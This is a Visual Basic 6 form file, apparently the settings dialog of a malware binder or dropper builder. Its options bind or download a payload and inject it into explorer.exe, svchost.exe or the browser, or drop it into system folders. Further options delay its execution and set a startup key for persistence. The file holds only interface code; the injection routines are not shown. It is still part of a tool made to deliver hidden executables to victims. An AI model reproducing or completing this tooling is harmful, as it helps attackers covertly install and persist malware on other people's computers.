VERSION 5.00
Begin VB.Form Form4 
   BorderStyle     =   0  'None
   Caption         =   "Form4"
   ClientHeight    =   7500
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   LinkTopic       =   "Form4"
   ScaleHeight     =   7500
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame6 
      BackColor       =   &H80000014&
      Caption         =   "Startup Options"
      Height          =   1095
      Left            =   240
      TabIndex        =   26
      Top             =   5640
      Width           =   4215
      Begin VB.TextBox Text5 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   28
         Top             =   720
         Width           =   3975
      End
      Begin VB.CheckBox Check5 
         BackColor       =   &H80000014&
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label Label5 
         BackColor       =   &H80000014&
         Caption         =   "Startup Key"
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   480
         Width           =   3975
      End
   End
   Begin VB.Frame Frame5 
      BackColor       =   &H80000014&
      Caption         =   "Delay to Next Reboot"
      Height          =   1215
      Left            =   2640
      TabIndex        =   22
      Top             =   2160
      Width           =   1815
      Begin VB.TextBox Text4 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   24
         Top             =   840
         Width           =   1575
      End
      Begin VB.CheckBox Check4 
         BackColor       =   &H80000014&
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   23
         Top             =   240
         Width           =   1215
      End
      Begin VB.Label Label4 
         BackColor       =   &H80000014&
         Caption         =   "KeyName"
         Height          =   255
         Left            =   120
         TabIndex        =   25
         Top             =   600
         Width           =   1575
      End
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H80000014&
      Caption         =   "Save EOF"
      Height          =   255
      Left            =   2640
      TabIndex        =   14
      Top             =   1920
      Width           =   1815
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H80000014&
      Caption         =   "Delayed Execution"
      Height          =   1695
      Left            =   240
      TabIndex        =   8
      Top             =   1800
      Width           =   2295
      Begin VB.TextBox Text1 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   13
         Top             =   1320
         Width           =   735
      End
      Begin VB.OptionButton Option3 
         BackColor       =   &H80000014&
         Caption         =   "Hours"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   1080
         Width           =   975
      End
      Begin VB.OptionButton Option2 
         BackColor       =   &H80000014&
         Caption         =   "Minutes"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   840
         Width           =   975
      End
      Begin VB.OptionButton Option1 
         BackColor       =   &H80000014&
         Caption         =   "Seconds"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   600
         Width           =   975
      End
      Begin VB.CheckBox Check2 
         BackColor       =   &H80000014&
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Width           =   1695
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000014&
      Caption         =   "Drop To"
      Height          =   855
      Left            =   2640
      TabIndex        =   6
      Top             =   840
      Width           =   1935
      Begin VB.ComboBox Combo2 
         Height          =   315
         ItemData        =   "Form4.frx":0000
         Left            =   120
         List            =   "Form4.frx":0002
         Style           =   2  'Dropdown List
         TabIndex        =   7
         Top             =   360
         Width           =   1695
      End
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000014&
      Caption         =   "Memory Execution"
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   600
      Width           =   1695
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000014&
      Caption         =   "Inject Into To"
      Height          =   855
      Left            =   240
      TabIndex        =   1
      Top             =   840
      Width           =   2295
      Begin VB.ComboBox Combo1 
         Enabled         =   0   'False
         Height          =   315
         ItemData        =   "Form4.frx":0004
         Left            =   240
         List            =   "Form4.frx":0006
         Style           =   2  'Dropdown List
         TabIndex        =   2
         Top             =   360
         Width           =   1815
      End
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H80000014&
      Caption         =   "File Source"
      Height          =   2175
      Left            =   240
      TabIndex        =   15
      Top             =   3480
      Width           =   4215
      Begin VB.TextBox Text3 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   19
         Top             =   1800
         Width           =   3975
      End
      Begin VB.OptionButton Option5 
         BackColor       =   &H80000014&
         Caption         =   "Internet (File will be downloaded)"
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   1440
         Width           =   3735
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   120
         TabIndex        =   17
         Top             =   600
         Width           =   3975
      End
      Begin VB.OptionButton Option4 
         BackColor       =   &H80000014&
         Caption         =   "HDD (File will be binded)"
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   240
         Value           =   -1  'True
         Width           =   2535
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "Browse"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000018&
         Height          =   255
         Left            =   1800
         TabIndex        =   21
         Top             =   1080
         Visible         =   0   'False
         Width           =   855
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Browse"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000016&
         Height          =   255
         Left            =   1800
         TabIndex        =   20
         Top             =   1080
         Width           =   855
      End
      Begin VB.Image Image4 
         Height          =   435
         Left            =   1080
         Picture         =   "Form4.frx":0008
         Top             =   960
         Width           =   1965
      End
   End
   Begin VB.Label Label12 
      BackStyle       =   0  'Transparent
      Caption         =   "OK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   2160
      TabIndex        =   4
      Top             =   6960
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "OK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   2160
      TabIndex        =   3
      Top             =   6960
      Width           =   855
   End
   Begin VB.Image Image8 
      Height          =   435
      Left            =   1320
      Picture         =   "Form4.frx":3C7C
      Top             =   6840
      Width           =   1965
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "                                Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4095
   End
   Begin VB.Image Image1 
      Height          =   60
      Left            =   -360
      Picture         =   "Form4.frx":78F0
      Top             =   7440
      Width           =   11985
   End
   Begin VB.Image Image3 
      Height          =   255
      Left            =   4120
      Picture         =   "Form4.frx":AB07
      Top             =   60
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Image Image2 
      Height          =   255
      Left            =   4120
      Picture         =   "Form4.frx":DD2C
      Top             =   60
      Width           =   495
   End
   Begin VB.Image Image9 
      Height          =   375
      Left            =   0
      Picture         =   "Form4.frx":10F45
      Top             =   0
      Width           =   12000
   End
   Begin VB.Image Image7 
      Height          =   8610
      Left            =   4620
      Picture         =   "Form4.frx":15790
      Top             =   0
      Width           =   60
   End
   Begin VB.Image Image5 
      Height          =   8610
      Left            =   0
      Picture         =   "Form4.frx":1889D
      Top             =   0
      Width           =   60
   End
   Begin VB.Image Image15 
      DragMode        =   1  'Automatic
      Height          =   12000
      Left            =   0
      Picture         =   "Form4.frx":1B9F3
      Top             =   0
      Width           =   12000
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Dragging As Boolean
Private SettedX As Integer, SettedY As Integer
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function GetFileNameFromBrowseW Lib "shell32" Alias "#63" (ByVal hwndOwner As Long, ByVal lpstrFile As Long, ByVal nMaxFile As Long, ByVal lpstrInitialDir As Long, ByVal lpstrDefExt As Long, ByVal lpstrFilter As Long, ByVal lpstrTitle As Long) As Long

Private Sub Check1_Click()
If Check1.Value = Checked Then
Combo1.Enabled = True
Combo2.Enabled = False
Frame5.Enabled = False
Frame6.Enabled = False
End If

If Check1.Value = Unchecked Then
Combo1.Enabled = False
Combo2.Enabled = True
Frame5.Enabled = True
Frame6.Enabled = True
End If
End Sub
Private Sub Check2_Click()

If Check2.Value = Checked Then
    Text1.Enabled = True
    Option1.Enabled = True
    Option2.Enabled = True
    Option3.Enabled = True
 Else
    Check2.Value = vbUnchecked
    Text1.Enabled = False
    Text1 = ""
    Option1.Enabled = False
    Option2.Enabled = False
    Option3.Enabled = False
End If
End Sub

Private Sub Check3_Click()
If Check3.Value = Checked Then
SaveEOF = True
End If

If Check3.Value = Unchecked Then
SaveEOF = False
End If
End Sub
Private Sub Check4_Click()
If Check4.Value = Checked Then
Text4.Enabled = True
End If

If Check4.Value = Unchecked Then
Text4.Enabled = False
Text4 = ""
End If
End Sub

Private Sub Check5_Click()
If Check5.Value = Checked Then
Text5.Enabled = True
End If

If Check5.Value = Unchecked Then
Text5.Enabled = False
Text5 = ""
End If
End Sub
Private Function BrowseHDD()
Dim sSave As String
If Text3 = "" Then
            If AreEditing = 1 Then Form1.ListView1.ListItems.Remove (Form1.ListView1.SelectedItem.Index)
            sSave = Space(255)
            GetFileNameFromBrowseW Me.hWnd, StrPtr(sSave), 255, StrPtr("c:\"), StrPtr("txt"), StrPtr("All files (*.*)" + Chr$(0) + "*.*" + Chr$(0)), StrPtr("Select File")
            With Form1.ListView1.ListItems.Add(, , Left$(sSave, lstrlen(sSave)))
            .SubItems(1) = "HDD"
            .SubItems(2) = "Inject into ThisExe"
            .SubItems(3) = "0"
            .SubItems(4) = "False"
            .SubItems(5) = "False"
            .SubItems(6) = "False"
            End With
            Text2 = Left$(sSave, lstrlen(sSave))
            
            Form1.ListView1.SelectedItem = Form1.ListView1.ListItems(Form1.ListView1.ListItems.Count)
            Exten = GetExtName(Form1.ListView1.SelectedItem)
            Check3.Value = Unchecked
            SaveEOF = False
                If Exten = "exe" Then
                Combo1.Enabled = True
                Combo2.Enabled = False
                Check1.Value = Checked
                End If
End If
End Function

Private Sub Form_Load()
Dim Exten As String

Combo1.AddItem "ThisExe"
Combo1.AddItem "Default Browser"
Combo1.AddItem "explorer.exe"
Combo1.AddItem "svchost.exe"
Combo1.ListIndex = 0

Combo2.AddItem "%TEMP%"
Combo2.AddItem "%WINDOWS%"
Combo2.AddItem "%SYSTEM32%"
Combo2.ListIndex = 0

If AreEditing = 1 Then
If Form1.ListView1.SelectedItem.SubItems(2) = "%TEMP%" Then
Check1.Value = Unchecked
Combo2.ListIndex = 0
End If

If Form1.ListView1.SelectedItem.SubItems(2) = "%WINDOWS%" Then
Check1.Value = Unchecked
Combo2.ListIndex = 1
End If
If Form1.ListView1.SelectedItem.SubItems(2) = "%SYSTEM32%" Then
Check1.Value = Unchecked
Combo2.ListIndex = 2
End If

If Form1.ListView1.SelectedItem.SubItems(2) = "Inject into ThisExe" Then
Check1.Value = Checked
Combo1.ListIndex = 0
End If

If Form1.ListView1.SelectedItem.SubItems(2) = "Inject into Default Browser" Then
Check1.Value = Checked
Combo1.ListIndex = 1
End If

If Form1.ListView1.SelectedItem.SubItems(2) = "Inject into explorer.exe" Then
Check1.Value = Checked
Combo1.ListIndex = 2
End If

If Form1.ListView1.SelectedItem.SubItems(2) = "Inject into svchost.exe" Then
Check1.Value = Checked
Combo1.ListIndex = 3
End If

If Form1.ListView1.SelectedItem.SubItems(3) <> 0 Then
Check2.Value = Checked
Option1.Value = True
Text1 = Form1.ListView1.SelectedItem.SubItems(3) / 1000
End If

If Form1.ListView1.SelectedItem.SubItems(4) = True Then
Check3.Value = Checked
End If

If Form1.ListView1.SelectedItem.SubItems(1) = "HDD" Then
Text2 = Form1.ListView1.SelectedItem.Text
Option4.Value = True
End If

If Form1.ListView1.SelectedItem.SubItems(1) = "Internet" Then
Text3 = Form1.ListView1.SelectedItem.Text
Option5.Value = True
End If

If Form1.ListView1.SelectedItem.SubItems(5) <> "False" Then
Check4.Value = Checked
Text4 = Form1.ListView1.SelectedItem.SubItems(5)
End If

If Form1.ListView1.SelectedItem.SubItems(6) = "True" Then
Check5.Value = Checked
Text5 = Form1.ListView1.SelectedItem.SubItems(6)
End If

End If

End Sub

Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = True
End Sub

Private Sub Image3_Click()
Call HideForm
End Sub

Private Sub Image4_Click()
Call BrowseHDD
End Sub

Private Sub Image9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = False
End Sub

Private Sub Image8_Click()
Call HideForm
End Sub
Private Sub Label11_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label12.Visible = True
End Sub
Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = True
End Sub
Private Sub Image15_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label12.Visible = False
Image3.Visible = False
End Sub

Private Sub Label12_Click()
Call HideForm
End Sub

Private Function HideForm()
On Error Resume Next
If SourceOfFile = "Internet" And Text2 = "" Then
            If AreEditing = 1 Then Form1.ListView1.ListItems.Remove (Form1.ListView1.SelectedItem.Index)
            If Left(Text3, 7) <> "http://" Or Form2.HowManyOf(Text3, ".") = 0 Then
            MsgBox "This is not a valid URL.", vbCritical
            Exit Function
            End If
            
            With Form1.ListView1.ListItems.Add(, , Text3)
            .SubItems(1) = "Internet"
            .SubItems(2) = "Inject into ThisExe"
            .SubItems(3) = "0"
            .SubItems(4) = "False"
            .SubItems(5) = "False"
            .SubItems(6) = "False"
            End With
            Form1.ListView1.SelectedItem = Form1.ListView1.ListItems(Form1.ListView1.ListItems.Count)
End If

DropTo = Combo2.Text
InjectionPath = "Inject into " & Combo1.Text
If Check1.Value = Checked Then Form1.ListView1.SelectedItem.SubItems(2) = InjectionPath
If Check1.Value = Unchecked Then Form1.ListView1.SelectedItem.SubItems(2) = DropTo
If Option1.Value = True And Text1 <> "" Then DelayInSecs = Text1.Text * 1000
If Option2.Value = True And Text1 <> "" Then DelayInSecs = Text1.Text * 60000
If Option3.Value = True And Text1 <> "" Then DelayInSecs = Text1.Text * 3600000

If Check2.Value = Unchecked Then DelayInSecs = 0
If Check2.Value = Checked Then Form1.ListView1.SelectedItem.SubItems(3) = DelayInSecs

Form1.ListView1.SelectedItem.SubItems(4) = SaveEOF
If Text4 <> "" Then
Form1.ListView1.SelectedItem.SubItems(5) = Text4
Else
Form1.ListView1.SelectedItem.SubItems(5) = "False"
End If

If Text5 <> "" Then
Form1.ListView1.SelectedItem.SubItems(6) = Text5
Else
Form1.ListView1.SelectedItem.SubItems(6) = "False"
End If
AreEditing = 0

Unload Form4
End Function

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
    If Dragging Then
        Me.Left = Me.Left + (x - SettedX)
        Me.Top = Me.Top + (y - SettedY)
    End If
Image3.Visible = False
End Sub

Private Sub Label1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    Dragging = False
End Sub

Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    SettedX = x
    SettedY = y
    Dragging = True
End Sub

Public Function GetExtName(ScanString As String) As String
   
    Dim intPos As String
    Dim intPosSave As String
    
    If InStr(ScanString, ".") = 0 Then
        GetExtName = ""
        Exit Function
    End If
    
       
    intPos = 1
    Do
        intPos = InStr(intPos, ScanString, ".")
        If intPos = 0 Then
            Exit Do
        Else
            intPos = intPos + 1
            intPosSave = intPos - 1
        End If
    Loop

    GetExtName = Trim$(Mid$(ScanString, intPosSave + 1))

End Function

Private Sub Label3_Click()
Call BrowseHDD
End Sub

Private Sub Option4_Click()
If Option4.Value = True Then
Text3.Enabled = False
Text2.Enabled = True
SourceOfFile = "HDD"
Text3 = ""
End If

If Option4.Value = False Then
Text3.Enabled = True
Text2.Enabled = False
SourceOfFile = "Internet"
Text2 = ""
End If
End Sub

Private Sub Option5_Click()
If Option5.Value = True Then
Text2.Enabled = False
Text3.Enabled = True
SourceOfFile = "Internet"
Text2 = ""
End If

If Option5.Value = False Then
Text2.Enabled = True
Text3.Enabled = False
SourceOfFile = "HDD"
Text3 = ""
End If
End Sub

Private Sub Frame4_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = False
End Sub


